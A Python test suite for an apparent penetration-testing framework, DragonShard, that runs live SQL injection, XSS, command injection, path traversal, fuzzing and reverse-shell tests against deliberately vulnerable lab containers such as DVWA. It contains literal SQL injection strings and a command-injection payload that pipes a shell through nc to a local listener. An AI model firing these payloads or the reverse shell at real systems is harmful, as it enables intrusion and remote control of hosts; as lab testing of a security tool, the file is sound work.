#!/usr/bin/env python3
"""
Live Attack Tests for DragonShard

These tests perform actual attacks against vulnerable Docker containers
instead of using mock data. This provides realistic testing of DragonShard's
capabilities against real targets.
"""

import asyncio
import json
import logging
import subprocess
import time
import unittest
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests

from dragonshard.api_inference.unified_crawler import UnifiedCrawler, smart_crawl
from dragonshard.core.test_utils import BaseTestCase, TestPayloads, TestTargets, setup_test_imports
from dragonshard.executor.reverse_shell import ReverseShellHandler
from dragonshard.executor.session_manager import SessionManager
from dragonshard.fuzzing.fuzzer import Fuzzer

# from dragonshard.fuzzing.mutators import GeneticMutator
# from dragonshard.planner.chain_planner import ChainPlanner
# from dragonshard.planner.vulnerability_prioritization import VulnerabilityPrioritizer

# Set up test imports
setup_test_imports()

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class LiveAttackTestBase(BaseTestCase):
    """Base class for live attack tests."""

    def setUp(self):
        """Set up test environment."""
        super().setUp()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "DragonShard/1.0"})

        # Use shared test targets
        self.targets = TestTargets.get_available_targets()

        # Initialize DragonShard components
        self.crawler = UnifiedCrawler()
        self.fuzzer = Fuzzer()
        # self.mutator = GeneticMutator()  # Commented out since import is commented
        # self.session_manager = SessionManager()  # Commented out since import is commented
        # self.reverse_shell_handler = ReverseShellHandler()  # Commented out since import is commented

    def test_target_availability(self):
        """Test that all vulnerable targets are available."""
        logger.info("🧪 Testing target availability...")

        for name, url in self.targets.items():
            with self.subTest(target=name):
                self.assertTrue(
                    self.wait_for_target(url, timeout=30), f"Target {name} ({url}) is not available"
                )


class LiveSQLInjectionTests(LiveAttackTestBase):
    """Live SQL injection tests against vulnerable containers."""

    def test_dvwa_sql_injection(self):
        """Test SQL injection against DVWA."""
        target_url = self.targets["dvwa"]

        # First, we need to login to DVWA
        login_data = {"username": "admin", "password": "password", "Login": "Login"}

        try:
            # Get the login page to get CSRF token
            response = self.session.get(f"{target_url}/login.php")
            self.assertEqual(response.status_code, 200)

            # Login
            response = self.session.post(f"{target_url}/login.php", data=login_data)
            self.assertEqual(response.status_code, 200)

            # Test SQL injection on the SQL Injection page
            sql_payloads = TestPayloads.get_payloads_by_type("sql")

            for payload in sql_payloads:
                with self.subTest(payload=payload):
                    test_url = f"{target_url}/vulnerabilities/sqli/"
                    data = {"id": payload, "Submit": "Submit"}

                    response = self.session.post(test_url, data=data)

                    # Check for SQL injection indicators
                    indicators = [
                        "mysql_fetch_array()",
                        "mysql_num_rows()",
                        "You have an error in your SQL syntax",
                        "Warning: mysql_",
                        "SQLSTATE[",
                        "MySQL server version",
                    ]

                    found_indicators = []
                    for indicator in indicators:
                        if indicator.lower() in response.text.lower():
                            found_indicators.append(indicator)

                    if found_indicators:
                        logger.info(
                            f"✅ SQL injection detected with payload '{payload}': {found_indicators}"
                        )
                    else:
                        logger.info(f"⚠️ No SQL injection detected with payload '{payload}'")

        except Exception as e:
            logger.error(f"❌ DVWA SQL injection test failed: {e}")
            self.fail(f"DVWA SQL injection test failed: {e}")

    def test_vuln_php_sql_injection(self):
        """Test SQL injection against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        sql_payloads = TestPayloads.get_payloads_by_type("sql")

        for payload in sql_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/search"
                data = {"search": payload}

                response = self.session.post(test_url, data=data)

                # Check for SQL injection indicators
                indicators = [
                    "mysql_fetch_array()",
                    "mysql_num_rows()",
                    "You have an error in your SQL syntax",
                    "Warning: mysql_",
                    "SQLSTATE[",
                    "MySQL server version",
                ]

                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)

                if found_indicators:
                    logger.info(
                        f"✅ SQL injection detected with payload '{payload}': {found_indicators}"
                    )
                else:
                    logger.info(f"⚠️ No SQL injection detected with payload '{payload}'")

    def test_vuln_node_sql_injection(self):
        """Test SQL injection against vulnerable Node.js app."""
        target_url = self.targets["vuln-node"]

        sql_payloads = TestPayloads.get_payloads_by_type("sql")

        for payload in sql_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/search"
                data = {"search": payload}

                response = self.session.post(test_url, data=data)

                # Check for SQL injection indicators
                indicators = [
                    "sqlite3",
                    "SQLITE_ERROR",
                    "syntax error",
                    "near",
                    "unrecognized token",
                ]

                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)

                if found_indicators:
                    logger.info(
                        f"✅ SQL injection detected with payload '{payload}': {found_indicators}"
                    )
                else:
                    logger.info(f"⚠️ No SQL injection detected with payload '{payload}'")


class LiveXSSTests(LiveAttackTestBase):
    """Live XSS tests against vulnerable containers."""

    def test_vuln_php_xss(self):
        """Test XSS against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        xss_payloads = TestPayloads.get_payloads_by_type("xss")

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/?input={payload}"

                response = self.session.get(test_url)

                # Check if payload is reflected in response
                if payload in response.text:
                    logger.info(f"✅ XSS payload reflected: '{payload}'")
                else:
                    logger.info(f"⚠️ XSS payload not reflected: '{payload}'")

    def test_vuln_node_xss(self):
        """Test XSS against vulnerable Node.js app."""
        target_url = self.targets["vuln-node"]

        xss_payloads = TestPayloads.get_payloads_by_type("xss")

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/xss"
                data = {"input": payload}

                response = self.session.post(test_url, data=data)

                # Check if payload is reflected in response
                if payload in response.text:
                    logger.info(f"✅ XSS payload reflected: '{payload}'")
                else:
                    logger.info(f"⚠️ XSS payload not reflected: '{payload}'")


class LiveCommandInjectionTests(LiveAttackTestBase):
    """Live command injection tests against vulnerable containers."""

    def test_vuln_php_command_injection(self):
        """Test command injection against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        cmd_payloads = TestPayloads.get_payloads_by_type("command")

        for payload in cmd_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/command"
                data = {"command": payload}

                response = self.session.post(test_url, data=data)

                # Check for command injection indicators
                indicators = [
                    "root:x:0:0",
                    "bin:x:1:1",
                    "daemon:x:1:1",
                    "/bin/bash",
                    "/home/",
                    "uid=",
                    "gid=",
                ]

                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)

                if found_indicators:
                    logger.info(
                        f"✅ Command injection detected with payload '{payload}': {found_indicators}"
                    )
                else:
                    logger.info(f"⚠️ No command injection detected with payload '{payload}'")

    def test_vuln_node_command_injection(self):
        """Test command injection against vulnerable Node.js app."""
        target_url = self.targets["vuln-node"]

        cmd_payloads = TestPayloads.get_payloads_by_type("command")

        for payload in cmd_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/command"
                data = {"command": payload}

                response = self.session.post(test_url, data=data)

                # Check for command injection indicators
                indicators = [
                    "root:x:0:0",
                    "bin:x:1:1",
                    "daemon:x:1:1",
                    "/bin/bash",
                    "/home/",
                    "uid=",
                    "gid=",
                ]

                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)

                if found_indicators:
                    logger.info(
                        f"✅ Command injection detected with payload '{payload}': {found_indicators}"
                    )
                else:
                    logger.info(f"⚠️ No command injection detected with payload '{payload}'")


class LivePathTraversalTests(LiveAttackTestBase):
    """Live path traversal tests against vulnerable containers."""

    def test_vuln_php_path_traversal(self):
        """Test path traversal against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        path_payloads = TestPayloads.get_payloads_by_type("path")

        for payload in path_payloads:
            with self.subTest(payload=payload):
                test_url = f"{target_url}/file"
                data = {"file": payload}

                response = self.session.post(test_url, data=data)

                # Check for path traversal indicators
                indicators = [
                    "root:x:0:0",
                    "bin:x:1:1",
                    "daemon:x:1:1",
                    "localhost",
                    "127.0.0.1",
                    "Linux",
                ]

                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)

                if found_indicators:
                    logger.info(
                        f"✅ Path traversal detected with payload '{payload}': {found_indicators}"
                    )
                else:
                    logger.info(f"⚠️ No path traversal detected with payload '{payload}'")


class LiveCrawlerTests(LiveAttackTestBase):
    """Live crawler tests against vulnerable containers."""

    def test_crawl_vuln_php(self):
        """Test crawling the vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        try:
            # Crawl the target
            results = smart_crawl(target_url, max_pages=10)

            logger.info(f"✅ Crawled {len(results)} pages from {target_url}")

            # Check for discovered endpoints
            discovered_endpoints = list(results)

            logger.info(f"Discovered endpoints: {discovered_endpoints}")

            # Verify we found some endpoints
            self.assertGreater(len(discovered_endpoints), 0, "No endpoints discovered")

        except Exception as e:
            logger.error(f"❌ Crawler test failed: {e}")
            self.fail(f"Crawler test failed: {e}")

    def test_crawl_vuln_node(self):
        """Test crawling the vulnerable Node.js app."""
        target_url = self.targets["vuln-node"]

        try:
            # Crawl the target
            results = smart_crawl(target_url, max_pages=10)

            logger.info(f"✅ Crawled {len(results)} pages from {target_url}")

            # Check for discovered endpoints
            discovered_endpoints = list(results)

            logger.info(f"Discovered endpoints: {discovered_endpoints}")

            # Verify we found some endpoints
            self.assertGreater(len(discovered_endpoints), 0, "No endpoints discovered")

        except Exception as e:
            logger.error(f"❌ Crawler test failed: {e}")
            self.fail(f"Crawler test failed: {e}")


class LiveFuzzerTests(LiveAttackTestBase):
    """Live fuzzer tests against vulnerable containers."""

    def test_fuzz_vuln_php_sql_injection(self):
        """Test fuzzing SQL injection against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        try:
            # Initialize fuzzer
            fuzzer = Fuzzer()

            # Test endpoint
            test_url = f"{target_url}/search"

            # Base SQL injection payloads
            base_payloads = ["1' OR '1'='1", "1' UNION SELECT 1,2,3--", "admin'--"]

            # Run fuzzing
            results = fuzzer.fuzz_url(url=test_url, method="POST", payload_types=["sqli"])

            logger.info(f"✅ Fuzzed SQL injection against {test_url}")
            logger.info(f"Results: {len(results)} responses analyzed")

            # Check for successful attacks
            successful_attacks = [result for result in results if result.is_vulnerable]

            logger.info(f"Successful attacks: {len(successful_attacks)}")

        except Exception as e:
            logger.error(f"❌ Fuzzer test failed: {e}")
            self.fail(f"Fuzzer test failed: {e}")

    def test_fuzz_vuln_node_command_injection(self):
        """Test fuzzing command injection against vulnerable Node.js app."""
        target_url = self.targets["vuln-node"]

        try:
            # Initialize fuzzer
            fuzzer = Fuzzer()

            # Test endpoint
            test_url = f"{target_url}/command"

            # Base command injection payloads
            base_payloads = TestPayloads.get_payloads_by_type("command")

            # Run fuzzing
            results = fuzzer.fuzz_url(
                url=test_url, method="POST", payload_types=["command_injection"]
            )

            logger.info(f"✅ Fuzzed command injection against {test_url}")
            logger.info(f"Results: {len(results)} responses analyzed")

            # Check for successful attacks
            successful_attacks = [result for result in results if result.is_vulnerable]

            logger.info(f"Successful attacks: {len(successful_attacks)}")

        except Exception as e:
            logger.error(f"❌ Fuzzer test failed: {e}")
            self.fail(f"Fuzzer test failed: {e}")


class LiveReverseShellTests(LiveAttackTestBase):
    """Live reverse shell tests against vulnerable containers."""

    def test_reverse_shell_vuln_php(self):
        """Test reverse shell against vulnerable PHP app."""
        target_url = self.targets["vuln-php"]

        try:
            # Create a reverse shell listener
            handler = ReverseShellHandler()
            connection_id = handler.create_listener(port=4444)

            logger.info("✅ Created reverse shell listener on port 4444")

            # Test reverse shell trigger
            test_url = f"{target_url}/command"
            payload = "127.0.0.1; nc 127.0.0.1 4444 -e /bin/bash"

            response = self.session.post(test_url, data={"command": payload})

            logger.info(f"✅ Sent reverse shell payload to {test_url}")

            # Clean up
            handler.close_connection(connection_id)

        except Exception as e:
            logger.error(f"❌ Reverse shell test failed: {e}")
            self.fail(f"Reverse shell test failed: {e}")


class LiveIntegrationTests(LiveAttackTestBase):
    """Live integration tests that combine multiple DragonShard components."""

    def test_full_attack_chain(self):
        """Test a complete attack chain: crawl -> fuzz -> exploit."""
        target_url = self.targets["vuln-php"]

        try:
            # Step 1: Crawl the target
            logger.info("Step 1: Crawling target...")
            crawl_results = smart_crawl(target_url, max_pages=5)

            self.assertGreater(len(crawl_results), 0, "No pages discovered")
            logger.info(f"✅ Discovered {len(crawl_results)} pages")

            # Step 2: Fuzz discovered endpoints
            logger.info("Step 2: Fuzzing discovered endpoints...")
            fuzzer = Fuzzer()

            for url in crawl_results:
                if "search" in url:
                    fuzz_results = fuzzer.fuzz_url(url=url, method="POST", payload_types=["sqli"])

                    successful_attacks = [r for r in fuzz_results if r.is_vulnerable]
                    if successful_attacks:
                        logger.info(f"✅ Found vulnerabilities in {url}")
                        break

            # Step 3: Test session management
            logger.info("Step 3: Testing session management...")
            session_manager = SessionManager()
            session_id = session_manager.create_session(target_url)

            self.assertIsNotNone(session_id, "Failed to create session")
            logger.info(f"✅ Created session {session_id}")

            # Step 4: Test reverse shell capability
            logger.info("Step 4: Testing reverse shell capability...")
            reverse_shell_handler = ReverseShellHandler()
            connection_id = reverse_shell_handler.create_listener(port=4445)

            self.assertIsNotNone(connection_id, "Failed to create reverse shell listener")
            logger.info(f"✅ Created reverse shell listener {connection_id}")

            # Clean up
            reverse_shell_handler.close_connection(connection_id)
            session_manager.destroy_session(session_id)

            logger.info("✅ Full attack chain test completed successfully")

        except Exception as e:
            logger.error(f"❌ Full attack chain test failed: {e}")
            self.fail(f"Full attack chain test failed: {e}")


def run_live_tests():
    """Run all live tests."""
    logger.info("🚀 Starting Live Attack Tests")
    logger.info("=" * 60)

    # Check if Docker containers are running
    try:
        result = subprocess.run(
            ["docker-compose", "-f", "docker-compose.test.yml", "ps"],
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            logger.error("❌ Docker containers are not running!")
            logger.info("Please start the test environment with: make test-env-start")
            return False

        logger.info("✅ Docker containers are running")

    except FileNotFoundError:
        logger.error("❌ docker-compose not found!")
        return False

    # Run tests
    unittest.main(verbosity=2, exit=False)

    logger.info("=" * 60)
    logger.info("🎉 Live Attack Tests Completed!")


if __name__ == "__main__":
    run_live_tests()
